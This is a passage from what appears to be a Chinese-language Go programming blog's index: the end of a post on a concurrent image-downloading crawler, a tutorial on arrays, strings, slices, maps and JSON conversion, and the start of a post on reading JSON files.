waitGroup.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> CheckOk()</span><br><span class="line">	<span class="comment">// 创建一个新的协程来执行 Wait 后面的操作</span></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="comment">// 等待所有协程完成</span></span><br><span class="line">		waitGroup.Wait()</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 执行一些操作</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;All workers have completed.&quot;</span>)</span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="comment">// 下载协程，从管道中读取链接下载</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">		waitGroup.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">go</span> DownloadImg()</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	waitGroup.Wait()</span><br><span class="line">	elapse := time.Since(start)</span><br><span class="line">	fmt.Println(<span class="string">&quot;elapsed time is : &quot;</span>, elapse, <span class="string">&quot;s&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>hello_work&#x2F;main.go</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/crawl&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// crawl.GetCrawl1Img()</span></span><br><span class="line">	crawl.GetCrawl2Img()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>调用，下载了20张图片，共耗时7秒，大幅提升下载速度</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork&gt; <span class="keyword">go</span> run .\hello_work\main.<span class="keyword">go</span></span><br><span class="line">E:\proj\gowork\img\<span class="number">201912415221040677807.</span>jpg  download is success</span><br><span class="line">E:\proj\gowork\img\<span class="number">201912415221040677807.</span>jpg  download is success</span><br><span class="line">E:\proj\gowork\img\<span class="number">2019124152210546778011.</span>jpg  download is success</span><br><span class="line">All workers have completed.</span><br><span class="line">elapsed time is :  <span class="number">7.2002013</span>s s</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/f9d23e4/image-20230620203609304.png" alt="image-20230620203609304"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>代码主要来自<a href="https://www.topgoer.com/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E7%88%AC%E8%99%AB%E5%B0%8F%E6%A1%88%E4%BE%8B.html">这里</a></p>
</li>
<li><p>其中<code>CheckOk</code>代码中的<code>count</code>计算不正确，无法关闭<code>close(chanImageUrls)</code>，导致<code>waitGroup</code>无法关闭，引起阻塞，本次代码中已经修复</p>
</li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>go中字符串,切片,数组,map</title>
    <url>/aposts/43aefcf6/</url>
    <content><![CDATA[<h2 id="数组Array"><a href="#数组Array" class="headerlink" title="数组Array"></a>数组Array</h2><ul>
<li><p>是同一种数据类型的固定长度的序列。</p>
</li>
<li><p>数组是值类型，赋值和传参会复制整个数组，而不是指针。因此改变副本的值，不会改变本身的值</p>
</li>
<li><p>数组定义：var a [len]T，比如：var a [5]int，数组长度必须是常量，且是类型的组成部分。<strong>一旦定义，长度不能变。</strong></p>
</li>
<li><p>初始化</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">全局：</span><br><span class="line"> <span class="keyword">var</span> arr0 [<span class="number">5</span>]<span class="type">int</span> = [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"> <span class="keyword">var</span> arr1 = [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"> <span class="keyword">var</span> arr2 = [...]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line"> <span class="keyword">var</span> str = [<span class="number">5</span>]<span class="type">string</span>&#123;<span class="number">3</span>: <span class="string">&quot;hello world&quot;</span>, <span class="number">4</span>: <span class="string">&quot;tom&quot;</span>&#125;</span><br><span class="line"> 局部：</span><br><span class="line"> a := [<span class="number">3</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125;           <span class="comment">// 未初始化元素值为 0。</span></span><br><span class="line"> b := [...]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;   <span class="comment">// 通过初始化值确定数组长度。</span></span><br><span class="line"> c := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">2</span>: <span class="number">100</span>, <span class="number">4</span>: <span class="number">200</span>&#125; <span class="comment">// 使用索引号初始化元素。</span></span><br><span class="line"> d := [...]<span class="keyword">struct</span> &#123;</span><br><span class="line">     name <span class="type">string</span></span><br><span class="line">     age  <span class="type">uint8</span></span><br><span class="line"> &#125;&#123;</span><br><span class="line">     &#123;<span class="string">&quot;user1&quot;</span>, <span class="number">10</span>&#125;, <span class="comment">// 可省略元素类型。</span></span><br><span class="line">     &#123;<span class="string">&quot;user2&quot;</span>, <span class="number">20</span>&#125;, <span class="comment">// 别忘了最后一行的逗号。</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>如下代码所示：</p>
<ul>
<li>函数外定义字符串，为全局变量</li>
<li>在函数内定义s3 :&#x3D; “5555”，为局部变量</li>
<li>循环字符串时，单个字符的类型为<code>byte</code>，而字符有两种类型<ul>
<li>一种是 uint8 类型，或者叫 byte 型，代表了 ASCII 码的一个字符</li>
<li>另一种是 rune 类型，代表一个 UTF-8 字符，如中文，rune 类型等价于 int32 类型。</li>
</ul>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全局定义字符串</span></span><br><span class="line"><span class="keyword">var</span> s1 = <span class="string">`</span></span><br><span class="line"><span class="string">	111</span></span><br><span class="line"><span class="string">	222</span></span><br><span class="line"><span class="string">	33</span></span><br><span class="line"><span class="string">	`</span></span><br><span class="line"><span class="keyword">var</span> s2 = <span class="string">&quot;4444&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 局部定义</span></span><br><span class="line">	s3 := <span class="string">&quot;5555&quot;</span></span><br><span class="line">	<span class="keyword">var</span> a = <span class="string">&quot;中&quot;</span></span><br><span class="line">	fmt.Println(s1, s2, s3, a)</span><br><span class="line">	s := <span class="string">&quot;pprof.cn博客&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(s); i++ &#123; <span class="comment">//byte</span></span><br><span class="line">		fmt.Printf(<span class="string">&quot;%v(%c) &quot;</span>, s[i], s[i])</span><br><span class="line">		<span class="comment">//112(p) 112(p) 114(r) 111(o) 102(f) 46(.) 99(c) 110(n) 229(å) 141() 154() 229(å) 174(®) 162(¢)</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println()</span><br><span class="line">	<span class="comment">// 打印中文，需转换为rune类型</span></span><br><span class="line">	<span class="keyword">for</span> _, r := <span class="keyword">range</span> s &#123; <span class="comment">//rune</span></span><br><span class="line">		fmt.Printf(<span class="string">&quot;%v(%c) &quot;</span>, r, r)</span><br><span class="line">		<span class="comment">//112(p) 112(p) 114(r) 111(o) 102(f) 46(.) 99(c) 110(n) 21338(博) 23458(客)</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println()</span><br><span class="line"></span><br><span class="line">	s1 := <span class="string">&quot;hello&quot;</span></span><br><span class="line">	<span class="comment">// 强制类型转换</span></span><br><span class="line">	byteS1 := []<span class="type">byte</span>(s1)</span><br><span class="line">	byteS1[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span></span><br><span class="line">    fmt.Println(reflect.TypeOf(byteS1[<span class="number">0</span>])) <span class="comment">// uint8</span></span><br><span class="line">	fmt.Println(<span class="type">string</span>(byteS1)) <span class="comment">//Hello</span></span><br><span class="line"></span><br><span class="line">	s2 := <span class="string">&quot;博客&quot;</span></span><br><span class="line">	runeS2 := []<span class="type">rune</span>(s2)</span><br><span class="line">	runeS2[<span class="number">0</span>] = <span class="string">&#x27;狗&#x27;</span></span><br><span class="line">	fmt.Println(<span class="type">string</span>(runeS2)) <span class="comment">//狗客</span></span><br></pre></td></tr></table></figure>

<h2 id="byte"><a href="#byte" class="headerlink" title="byte"></a>byte</h2><ul>
<li>在字符串中代码已经详细说明了byte的定义，就是字符串中的每一个元素叫做“字符”，在遍历或者单个获取字符串元素时可以获得字符。</li>
</ul>
<h2 id="切片Slice"><a href="#切片Slice" class="headerlink" title="切片Slice"></a>切片Slice</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ul>
<li>看如下代码，为声明和初始化</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.声明切片，int类型的数组</span></span><br><span class="line">	<span class="keyword">var</span> s1 []<span class="type">int</span></span><br><span class="line">	<span class="keyword">if</span> s1 == <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;是空&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;不是空&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 2.:=</span></span><br><span class="line">	s2 := []<span class="type">int</span>&#123;&#125;</span><br><span class="line">	<span class="comment">// 3.make()</span></span><br><span class="line">	<span class="keyword">var</span> s3 []<span class="type">int</span> = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;s1,s2,s3&quot;</span>, s1, s2, s3) <span class="comment">// s1,s2,s3 [] [] []</span></span><br><span class="line">	<span class="comment">// 4.初始化赋值</span></span><br><span class="line">	<span class="keyword">var</span> s4 []<span class="type">int</span> = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;s4=&quot;</span>, s4) <span class="comment">// s4= []</span></span><br><span class="line">	s5 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">	fmt.Println(s5)</span><br><span class="line">	<span class="comment">// 5.从数组切片</span></span><br><span class="line">	arr := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">	<span class="keyword">var</span> s6 []<span class="type">int</span></span><br><span class="line">	<span class="comment">// 前包后不包</span></span><br><span class="line">	s6 = arr[<span class="number">1</span>:<span class="number">4</span>]</span><br><span class="line">	fmt.Println(<span class="string">&quot;s6=&quot;</span>, s6) <span class="comment">//s6= [2 3 4]</span></span><br></pre></td></tr></table></figure>

<h3 id="append"><a href="#append" class="headerlink" title="append"></a>append</h3><ul>
<li>切片追加</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;slice a : %v\n&quot;</span>, a) <span class="comment">// slice a : [1 2 3]</span></span><br><span class="line"><span class="keyword">var</span> b = []<span class="type">int</span>&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;slice b : %v\n&quot;</span>, b) <span class="comment">// slice b : [4 5 6]</span></span><br><span class="line">c := <span class="built_in">append</span>(a, b...)</span><br><span class="line">fmt.Printf(<span class="string">&quot;slice c : %v\n&quot;</span>, c) <span class="comment">//slice c : [1 2 3 4 5 6]</span></span><br><span class="line">d := <span class="built_in">append</span>(c, <span class="number">7</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;slice d : %v\n&quot;</span>, d) <span class="comment">// slice d : [1 2 3 4 5 6 7]</span></span><br><span class="line">e := <span class="built_in">append</span>(d, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;slice e : %v\n&quot;</span>, e) <span class="comment">// slice e : [1 2 3 4 5 6 7 8 9 10]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>向 slice 尾部添加数据，返回新的 slice 对象</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s1 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, &amp;s1) <span class="comment">// 0xc000008078</span></span><br><span class="line"></span><br><span class="line">s2 := <span class="built_in">append</span>(s1, <span class="number">1</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, &amp;s2) <span class="comment">// 0xc000008090</span></span><br><span class="line"></span><br><span class="line">fmt.Println(s1, s2) <span class="comment">// [] [1]</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>切片是指针类型，数组是值类型</li>
<li>数组的赋值形式为值传递，切片的赋值形式为引用传递</li>
<li>数组的长度是固定的，而切片长度可以任意调整（切片是动态的数组）</li>
<li>数组只有长度一个属性，而切片比数组多了一个容量（cap)属性</li>
</ul>
<h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><ul>
<li>map是一种无序的基于key-value的数据结构</li>
<li>定义<code>    map[KeyType]ValueType</code>，如<code>map[string]int</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="comment">// 使用make初始化一个map</span></span><br><span class="line">    scoreMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">    scoreMap[<span class="string">&quot;张三&quot;</span>] = <span class="number">90</span></span><br><span class="line">    scoreMap[<span class="string">&quot;小明&quot;</span>] = <span class="number">100</span></span><br><span class="line">    scoreMap[<span class="string">&quot;王五&quot;</span>] = <span class="number">60</span></span><br><span class="line">    <span class="built_in">delete</span>(scoreMap, <span class="string">&quot;小明&quot;</span>)<span class="comment">//将小明:100从map中删除</span></span><br><span class="line">    <span class="keyword">for</span> k,v := <span class="keyword">range</span> scoreMap&#123;</span><br><span class="line">        fmt.Println(k, v)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="元素为map类型的切片"><a href="#元素为map类型的切片" class="headerlink" title="元素为map类型的切片"></a>元素为map类型的切片</h3><ul>
<li>对应于python中的<code>[&#123;&quot;name&quot;:&quot;王五&quot;,&quot;password&quot;: &quot;123456&quot;, &quot;address&quot;:&quot;红旗大街&quot;&#125;,&#123;&#125;]</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mapSlice = <span class="built_in">make</span>([]<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>, <span class="number">3</span>)</span><br><span class="line">	<span class="keyword">for</span> index, value := <span class="keyword">range</span> mapSlice &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;index:%d value:%v\n&quot;</span>, index, value) <span class="comment">//index:0 value:map[]</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;after init&quot;</span>)</span><br><span class="line">	<span class="comment">// 对切片中的map元素进行初始化</span></span><br><span class="line">	mapSlice[<span class="number">0</span>] = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>, <span class="number">10</span>)</span><br><span class="line">	mapSlice[<span class="number">0</span>][<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;王五&quot;</span></span><br><span class="line">	mapSlice[<span class="number">0</span>][<span class="string">&quot;password&quot;</span>] = <span class="string">&quot;123456&quot;</span></span><br><span class="line">	mapSlice[<span class="number">0</span>][<span class="string">&quot;address&quot;</span>] = <span class="string">&quot;红旗大街&quot;</span></span><br><span class="line">	<span class="keyword">for</span> index, value := <span class="keyword">range</span> mapSlice &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;index:%d value:%v\n&quot;</span>, index, value) </span><br><span class="line">        <span class="comment">// index:0 value:map[address:红旗大街 name:王五 password:123456]</span></span><br><span class="line">        <span class="comment">//index:1 value:map[]</span></span><br><span class="line">        <span class="keyword">for</span> k, v := <span class="keyword">range</span> value &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;k=&quot;</span>, k, <span class="string">&quot;v=&quot;</span>, v)</span><br><span class="line">			<span class="comment">//k= name v= 王五</span></span><br><span class="line">			<span class="comment">//k= address v= 红旗大</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(mapSlice) <span class="comment">// [map[address:红旗大街 name:王五 password:123456] map[] map[]]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="值为切片类型的map"><a href="#值为切片类型的map" class="headerlink" title="值为切片类型的map"></a>值为切片类型的map</h3><ul>
<li>对应于python中{“中国”:[“北京”, “上海”]}</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sliceMap = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>][]<span class="type">string</span>, <span class="number">3</span>)</span><br><span class="line">	fmt.Println(sliceMap)</span><br><span class="line">	fmt.Println(<span class="string">&quot;after init&quot;</span>)</span><br><span class="line">	key := <span class="string">&quot;中国&quot;</span></span><br><span class="line">	value, ok := sliceMap[key]</span><br><span class="line">	<span class="keyword">if</span> !ok &#123;</span><br><span class="line">		value = <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	value = <span class="built_in">append</span>(value, <span class="string">&quot;北京&quot;</span>, <span class="string">&quot;上海&quot;</span>)</span><br><span class="line">	sliceMap[key] = value</span><br><span class="line">	fmt.Println(sliceMap)       <span class="comment">//map[中国:[北京 上海]]</span></span><br><span class="line">	fmt.Println(sliceMap[<span class="string">&quot;中国&quot;</span>]) <span class="comment">// [北京 上海]</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> sliceMap[<span class="string">&quot;中国&quot;</span>] &#123;</span><br><span class="line">		fmt.Println(v)</span><br><span class="line">        <span class="comment">// 北京</span></span><br><span class="line">        <span class="comment">// 上海</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(sliceMap) <span class="comment">//map[中国:[北京 上海]]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h3><ul>
<li><p>interface是一种抽象的类型，可以用来表示任何类型</p>
</li>
<li><p>比如如下场景，不像写结构体，就可以用</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">js := <span class="string">`&#123;&quot;int&quot;:1,&quot;string&quot;:&quot;qwertyuiop&quot;,&quot;float&quot;:1.111&#125;`</span></span><br><span class="line">jsm := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">err := json.Unmarshal([]<span class="type">byte</span>(js), &amp;jsm)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(jsm) <span class="comment">// map[float:1.111 int:1 string:qwertyuiop]</span></span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> jsm &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;k=&quot;</span>, k, <span class="string">&quot;v=&quot;</span>, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><h3 id="byte-转换为string"><a href="#byte-转换为string" class="headerlink" title="byte 转换为string"></a>byte 转换为string</h3><ul>
<li>data1.json中内容为：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 2</span><br><span class="line">2 3</span><br><span class="line">中国 4</span><br></pre></td></tr></table></figure>

<ul>
<li>代码如下</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">f, err := os.Open(<span class="string">&quot;hello_work\\data1.json&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;open file eror:&quot;</span>, err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"><span class="comment">// 读取文件内容，类型为[]byte</span></span><br><span class="line">byteValue, _ := ioutil.ReadAll(f)</span><br><span class="line">fmt.Println(byteValue)                 <span class="comment">// [49 32 50 13 10 50 32 51 13 10 228 184 173 229 155 189 32 52]</span></span><br><span class="line">fmt.Println(reflect.TypeOf(byteValue)) <span class="comment">// []uint8</span></span><br><span class="line">s := <span class="type">string</span>(byteValue)</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> s &#123;</span><br><span class="line">    fmt.Println(<span class="type">string</span>(v))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="string-转换为map"><a href="#string-转换为map" class="headerlink" title="string 转换为map"></a>string 转换为map</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> conver</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Code <span class="type">int</span></span><br><span class="line">	Msg  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StrT</span><span class="params">()</span></span> &#123;</span><br><span class="line">	js := <span class="string">`&#123;&quot;code&quot;:1,&quot;msg&quot;:&quot;qwertyuiop&quot;&#125;`</span></span><br><span class="line">	<span class="comment">// 定义一个map的key为string,值类型为不确定的结构体</span></span><br><span class="line">	jsm := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">	<span class="comment">// 反序列化</span></span><br><span class="line">	err := json.Unmarshal([]<span class="type">byte</span>(js), &amp;jsm)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(jsm) <span class="comment">// map[code:1 msg:qwertyuiop]</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> user User</span><br><span class="line">	err1 := json.Unmarshal([]<span class="type">byte</span>(js), &amp;user)</span><br><span class="line">	<span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err1)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(user)                 <span class="comment">//&#123;1 qwertyuiop&#125;</span></span><br><span class="line">	fmt.Println(reflect.TypeOf(user)) <span class="comment">//conver.User</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="byte-转换为map"><a href="#byte-转换为map" class="headerlink" title="byte 转换为map"></a>byte 转换为map</h3><ul>
<li>data.json内容</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span> <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;西瓜&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;苹果&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">f, err := os.Open(<span class="string">&quot;hello_work\\data.json&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open file eror:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line">	byteValue, _ := ioutil.ReadAll(f)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 定义一个map的key为string,值类型为不确定的结构体</span></span><br><span class="line">	jsm := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">	<span class="comment">// 反序列化</span></span><br><span class="line">	err1 := json.Unmarshal(byteValue, &amp;jsm)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(jsm) <span class="comment">// map[code:1 data:[map[id:1 name:西瓜] map[id:2 name:苹果]] msg:success]</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// map转换为string</span></span><br><span class="line">	dataType, _ := json.Marshal(jsm)</span><br><span class="line">	dataString := <span class="type">string</span>(dataType)</span><br><span class="line">	fmt.Println(dataString)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="map转换为string"><a href="#map转换为string" class="headerlink" title="map转换为string"></a>map转换为string</h3><ul>
<li>在byte 转换为map中，最后三行代码就是把map转为string</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">dataType, _ := json.Marshal(jsm)</span><br><span class="line">dataString := <span class="type">string</span>(dataType)</span><br><span class="line">fmt.Println(dataString)</span><br></pre></td></tr></table></figure>



<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><a href="https://www.topgoer.com/go%E5%9F%BA%E7%A1%80/">go基础</a></li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>go中读取json</title>
    <url>/aposts/cc41f256/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>本文主要对json内容的读取</li>
</ul>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul>
<li><code>data.json</code>文件内容</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span> <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;西瓜&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;苹果&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>main.go</code>代码</li>
